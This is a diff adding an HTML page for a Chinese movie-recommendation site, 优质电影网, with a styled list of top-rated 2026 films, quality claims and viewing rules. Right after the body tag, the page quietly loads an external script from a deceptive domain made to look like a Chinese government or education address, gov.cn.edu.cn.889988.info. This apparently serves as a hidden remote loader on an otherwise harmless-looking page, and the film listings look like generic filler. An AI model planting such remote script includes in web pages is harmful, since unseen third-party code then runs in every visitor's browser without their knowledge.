@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="keywords" content="优质电影网,youzhidianyingwang,优质电影,高清电影,电影排行榜,好片推荐">
+<meta name="description" content="优质电影网 - 优中选优的好电影，每日精选高分佳作与院线热映，为你打造高品质观影指南。">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>优质电影网 | 优中选优 · 高品质观影指南</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei",sans-serif;background:#fafbfc;color:#24303d;line-height:1.7;-webkit-font-smoothing:antialiased;overflow-x:hidden}
+a{color:inherit;text-decoration:none}
+:root{
+  --pri:#0a6b5e;--pri2:#14a98c;--accent:#ff6b4a;
+  --ink:#1a2b33;--gray:#7a8794;--line:#e8edf0;
+}
+.wrap{max-width:1060px;margin:0 auto;padding:0 18px}
+
+/* ===== Top info ===== */
+.topbar{background:var(--ink);color:#fff;font-size:11px;padding:7px 0}
+.topbar .wrap{display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px}
+.topbar a{color:#9fb4be;margin-left:14px}
+.topbar a:hover{color:var(--accent)}
+
+/* ===== Header ===== */
+.hd{background:#fff;border-bottom:1px solid var(--line);position:sticky;top:0;z-index:50}
+.hd .wrap{display:flex;align-items:center;justify-content:space-between;height:68px}
+.brand{display:flex;align-items:center;gap:11px}
+.brand .dot{width:38px;height:38px;border-radius:11px;background:var(--pri);color:#fff;font-weight:900;font-size:15px;display:flex;align-items:center;justify-content:center}
+.brand b{font-size:20px;font-weight:900;color:var(--ink);letter-spacing:.5px}
+.brand small{display:block;font-size:9px;color:var(--gray);letter-spacing:1.5px;font-weight:700}
+.nav{display:none;gap:4px}
+.nav a{padding:8px 17px;border-radius:9px;font-size:14px;font-weight:700;color:#4a5864;transition:.2s}
+.nav a:hover,.nav a.act{background:var(--pri);color:#fff}
+.ham{width:42px;height:42px;border-radius:11px;background:var(--pri);color:#fff;display:flex;align-items:center;justify-content:center;font-size:20px;cursor:pointer}
+.drawer{display:none;background:#fff;border-bottom:1px solid var(--line);padding:12px 18px}
+.drawer.on{display:block}
+.drawer a{display:block;padding:13px 0;border-bottom:1px solid var(--line);font-weight:700;font-size:15px}
+.drawer a:last-child{border:none}
+
+/* ===== Hero ===== */
+.hero{background:linear-gradient(135deg,#0a6b5e,#14a98c);color:#fff;padding:60px 0;position:relative;overflow:hidden}
+.hero::before{content:"优";position:absolute;right:-20px;bottom:-40px;font-size:230px;font-weight:900;color:rgba(255,255,255,.06)}
+.hero .wrap{position:relative;z-index:1}
+.badge{display:inline-block;background:rgba(255,255,255,.18);border:1px solid rgba(255,255,255,.3);padding:5px 14px;border-radius:20px;font-size:11px;font-weight:700;letter-spacing:1px;margin-bottom:20px}
+.hero h1{font-size:34px;font-weight:900;line-height:1.3;margin-bottom:16px}
+.hero h1 em{font-style:normal;color:#ffd93d}
+.hero p{max-width:520px;font-size:14px;color:rgba(255,255,255,.88);margin-bottom:26px}
+.hstat{display:flex;gap:34px;flex-wrap:wrap}
+.hstat div{text-align:center}
+.hstat strong{display:block;font-size:27px;font-weight:900;color:#ffd93d}
+.hstat span{font-size:11px;color:rgba(255,255,255,.8)}
+
+/* ===== Filter tabs ===== */
+.tabs{display:flex;gap:8px;overflow-x:auto;padding:6px 0 0;margin-bottom:-1px}
+.tabs button{white-space:nowrap;border:1px solid var(--line);background:#fff;padding:9px 20px;border-radius:22px;font-size:13px;font-weight:700;color:#4a5864;cursor:pointer}
+.tabs button.on{background:var(--accent);border-color:var(--accent);color:#fff}
+
+/* ===== Film list (row layout) ===== */
+.sec{padding:48px 0}
+.sec-head{margin-bottom:26px}
+.sec-head h2{font-size:24px;font-weight:900;color:var(--ink);display:flex;align-items:center;gap:10px}
+.sec-head h2::before{content:"";width:5px;height:22px;border-radius:3px;background:var(--accent)}
+.sec-head p{font-size:13px;color:var(--gray);margin-top:6px}
+.flist{display:flex;flex-direction:column;gap:16px}
+.fcard{background:#fff;border:1px solid var(--line);border-radius:16px;display:flex;gap:16px;padding:16px;transition:.2s}
+.fcard:hover{border-color:var(--pri2);transform:translateX(4px);box-shadow:0 10px 28px rgba(10,107,94,.08)}
+.fcard .thumb{width:96px;height:130px;border-radius:12px;flex-shrink:0;display:flex;align-items:center;justify-content:center;color:#fff;font-weight:900;font-size:15px;text-align:center;padding:8px}
+.fcard .info{flex:1;min-width:0}
+.fcard .info .tp{display:flex;justify-content:space-between;align-items:flex-start;gap:8px;margin-bottom:6px}
+.fcard .info h3{font-size:16px;font-weight:900;color:var(--ink)}
+.fcard .info .no{background:var(--accent);color:#fff;font-size:11px;font-weight:800;padding:2px 8px;border-radius:6px;flex-shrink:0}
+.fcard .info .meta{font-size:11px;color:var(--gray);margin-bottom:8px}
+.fcard .info .desc{font-size:12px;color:#5a6b78;line-height:1.7}
+.fcard .info .ft{display:flex;gap:8px;margin-top:10px;flex-wrap:wrap}
+.fcard .info .ft span{font-size:10px;background:#f0f5f4;color:var(--pri);padding:3px 9px;border-radius:5px;font-weight:600}
+
+/* ===== Quality cards ===== */
+.qgrid{display:grid;grid-template-columns:1fr;gap:16px}
+.qcard{background:#fff;border:1px solid var(--line);border-radius:18px;padding:26px;position:relative;overflow:hidden}
+.qcard::after{content:"";position:absolute;left:0;top:0;bottom:0;width:5px;background:var(--accent)}
+.qcard.alt::after{background:var(--pri2)}
+.qcard h3{font-size:17px;font-weight:900;color:var(--ink);margin-bottom:10px;display:flex;align-items:center;gap:9px}
+.qcard h3 i{font-style:normal;font-size:20px}
+.qcard p{font-size:13px;color:var(--gray);line-height:1.85}
+.qcard ul{margin-top:12px;padding-left:18px}
+.qcard li{font-size:12px;color:#5a6b78;margin-bottom:5px}
+
+/* ===== Notice ===== */
+.notice{background:var(--ink);color:#fff;border-radius:24px;padding:34px}
+.notice h3{font-size:20px;font-weight:900;margin-bottom:14px;color:#ffd93d}
+.notice ol{columns:2;column-gap:30px;padding-left:18px}
+.notice li{font-size:12px;color:#c3cfd8;margin-bottom:9px;break-inside:avoid}
+
+/* ===== Footer ===== */
+.ft{background:var(--ink);color:#fff;padding:44px 0 30px;margin-top:20px}
+.ft .wrap{text-align:center}
+.ft .site{font-size:19px;font-weight:900;margin-bottom:8px}
+.ft .url{color:var(--pri2);font-weight:700;font-size:14px;margin-bottom:20px;word-break:break-all}
+.ft .lk{display:flex;gap:22px;justify-content:center;flex-wrap:wrap;margin-bottom:24px}
+.ft .lk a{font-size:13px;color:#c3cfd8;font-weight:600}
+.ft .lk a:hover{color:var(--accent)}
+.ft p{font-size:11px;color:#7a8794;margin-bottom:5px}
+
+.gotop{position:fixed;right:16px;bottom:20px;z-index:90;width:46px;height:46px;border-radius:14px;background:var(--accent);color:#fff;font-weight:900;display:none;align-items:center;justify-content:center;font-size:18px;cursor:pointer}
+.gotop.on{display:flex}
+
+@media(min-width:560px){
+  .qgrid{grid-template-columns:1fr 1fr}
+  .fcard .thumb{width:110px;height:150px}
+}
+@media(min-width:860px){
+  .nav{display:flex}.ham{display:none}
+  .hero h1{font-size:48px}
+  .fcard .thumb{width:120px;height:160px}
+  .notice ol{columns:3}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<!-- Top info -->
+<div class="topbar">
+  <div class="wrap">
+    <span>欢迎来到 优质电影网 · 优中选优的好电影</span>
+    <span><a href="#">网站地图</a><a href="#">意见反馈</a><a href="#">RSS订阅</a></span>
+  </div>
+</div>
+
+<!-- Header -->
+<header class="hd">
+  <div class="wrap">
+    <div class="brand">
+      <div class="dot">优</div>
+      <div><b>优质电影网</b><small>YOUZHIDIANYINGWANG</small></div>
+    </div>
+    <nav class="nav">
+      <a href="#home" class="act">首页</a>
+      <a href="#rank">高分排行</a>
+      <a href="#why">品质保障</a>
+      <a href="#rule">观影须知</a>
+    </nav>
+    <div class="ham" onclick="document.getElementById('dr').classList.toggle('on')">☰</div>
+  </div>
+  <div class="drawer" id="dr">
+    <a href="#home" onclick="this.parentNode.classList.remove('on')">首页</a>
+    <a href="#rank" onclick="this.parentNode.classList.remove('on')">高分排行</a>
+    <a href="#why" onclick="this.parentNode.classList.remove('on')">品质保障</a>
+    <a href="#rule" onclick="this.parentNode.classList.remove('on')">观影须知</a>
+  </div>
+</header>
+
+<!-- Hero -->
+<section class="hero" id="home">
+  <div class="wrap">
+    <div class="badge">✦ YOUZHI · 优中选优</div>
+    <h1>每一帧都值得<br>为你<b><em>精选</em></b>好电影</h1>
+    <p>优质电影网专注高品质观影体验，每日精选高分佳作与院线热映，让每一次选择都不踩雷。</p>
+    <div class="hstat">
+      <div><strong>800+</strong><span>精选影片</span></div>
+      <div><strong>4K</strong><span>高清画质</span></div>
+      <div><strong>98%</strong><span>好评满意度</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- Filter -->
+<div class="wrap" style="margin-top:34px">
+  <div class="tabs">
+    <button class="on">全部</button>
+    <button>剧情</button>
+    <button>动作</button>
+    <button>喜剧</button>
+    <button>科幻</button>
+    <button>悬疑</button>
+    <button>动画</button>
+  </div>
+</div>
+
+<!-- Rank -->
+<section class="sec" id="rank">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>高分排行</h2>
+      <p>综合评分与口碑，为你筛选出本月最值得一看的影片</p>
+    </div>
+    <div class="flist">
+      <a href="#" class="fcard">
+        <div class="thumb" style="background:linear-gradient(160deg,#1e3c72,#2a5298)">云之彼端</div>
+        <div class="info">
+          <div class="tp"><h3>云之彼端</h3><span class="no">TOP 1</span></div>
+          <div class="meta">2026 · 剧情 / 治愈 · 9.4 分</div>
+          <div class="desc">跨越山海的温柔旅程，用最纯净的镜头语言讲述关于陪伴与告别的故事。</div>
+          <div class="ft"><span>治愈</span><span>获奖影片</span><span>高口碑</span></div>
+        </div>
+      </a>
+      <a href="#" class="fcard">
+        <div class="thumb" style="background:linear-gradient(160deg,#42275a,#734b6d)">暗夜追踪</div>
+        <div class="info">
+          <div class="tp"><h3>暗夜追踪</h3><span class="no">TOP 2</span></div>
+          <div class="meta">2026 · 悬疑 / 犯罪 · 9.1 分</div>
+          <div class="desc">一桩离奇案件牵出层层黑幕，高能反转不断，全程紧绷无尿点。</div>
+          <div class="ft"><span>烧脑</span><span>反转</span><span>热播</span></div>
+        </div>
+      </a>
+      <a href="#" class="fcard">
+        <div class="thumb" style="background:linear-gradient(160deg,#0f2027,#2c5364)">极速狂飙</div>
+        <div class="info">
+          <div class="tp"><h3>极速狂飙</h3><span class="no">TOP 3</span></div>
+          <div class="meta">2026 · 动作 / 竞速 · 8.9 分</div>
+          <div class="desc">肾上腺素飙升的极速对决，顶级视效打造沉浸式飙车盛宴。</div>
+          <div class="ft"><span>动作</span><span>视效大片</span></div>
+        </div>
+      </a>
+      <a href="#" class="fcard">
+        <div class="thumb" style="background:linear-gradient(160deg,#3a1c71,#d76d77)">星空邮局</div>
+        <div class="info">
+          <div class="tp"><h3>星空邮局</h3><span class="no">TOP 4</span></div>
+          <div class="meta">2026 · 奇幻 / 爱情 · 8.7 分</div>
+          <div class="desc">写给宇宙的情书，一场关于思念与重逢的浪漫奇幻冒险。</div>
+          <div class="ft"><span>奇幻</span><span>浪漫</span><span>高分</span></div>
+        </div>
+      </a>
+    </div>
+  </div>
+</section>
+
+<!-- Quality -->
+<section class="sec" id="why" style="padding-top:0">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>品质保障</h2>
+      <p>为什么选择优质电影网？四个理由告诉你</p>
+    </div>
+    <div class="qgrid">
+      <div class="qcard">
+        <h3><i>🎯</i>精选片单</h3>
+        <p>编辑团队严格筛选，拒绝烂片，每一部都经过评分与口碑双重验证。</p>
+        <ul><li>高分佳作优先</li><li>获奖影片收录</li><li>冷门遗珠挖掘</li></ul>
+      </div>
+      <div class="qcard alt">
+        <h3><i>🖥️</i>高清画质</h3>
+        <p>支持多档清晰度切换，大屏小屏都能享受影院级的视觉体验。</p>
+        <ul><li>高清 / 超清可选</li><li>适配各种网络</li><li>多端无缝切换</li></ul>
+      </div>
+      <div class="qcard">
+        <h3><i>⚡</i>极速加载</h3>
+        <p>优化加载策略，打开即看，告别漫长等待与卡顿缓冲。</p>
+        <ul><li>秒开播放</li><li>智能预加载</li><li>流畅不卡顿</li></ul>
+      </div>
+      <div class="qcard alt">
+        <h3><i>📱</i>全端适配</h3>
+        <p>手机、平板、电脑完美自适应，随时随地开启观影时光。</p>
+        <ul><li>移动端优先</li><li>触屏优化</li><li>横竖屏自适应</li></ul>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Notice -->
+<section class="sec" id="rule" style="padding-top:0">
+  <div class="wrap">
+    <div class="notice">
+      <h3>📋 观影须知</h3>
+      <ol>
+        <li>请遵守国家法律法规，观看正版授权内容</li>
+        <li>未成年人请在家长指导下合理观影</li>
+        <li>注意保护个人隐私，勿泄露账号信息</li>
+        <li>建议使用 Wi-Fi 观看以获得最佳体验</li>
+        <li>影片版权归原作者及出品方所有</li>
+        <li>本站仅为影视信息推荐平台</li>
+        <li>欢迎反馈优质影片与改进建议</li>
+      </ol>
+    </div>
+  </div>
+</section>
+
+<!-- Footer -->
+<footer class="ft">
+  <div class="wrap">
+    <div class="site">优质电影网 · YOUZHI DIANYING WANG</div>
+    <div class="url">https://youzhidianyingwang-wap.github.io</div>
+    <div class="lk">
+      <a href="#">首页</a>
+      <a href="#">高分排行</a>
+      <a href="#">品质保障</a>
+      <a href="#">观影须知</a>
+      <a href="#">联系我们</a>
+    </div>
+    <p>© 2026 优质电影网 · youzhidianyingwang 保留所有权利</p>
+    <p>本站为影视信息推荐平台，影片版权归原作者所有</p>
+  </div>
+</footer>
+
+<div class="gotop" id="gt" onclick="window.scrollTo({top:0,behavior:'smooth'})">↑</div>
+<script>
+window.addEventListener('scroll',function(){document.getElementById('gt').classList.toggle('on',window.scrollY>400);});
+</script>
+</body>
+</html>
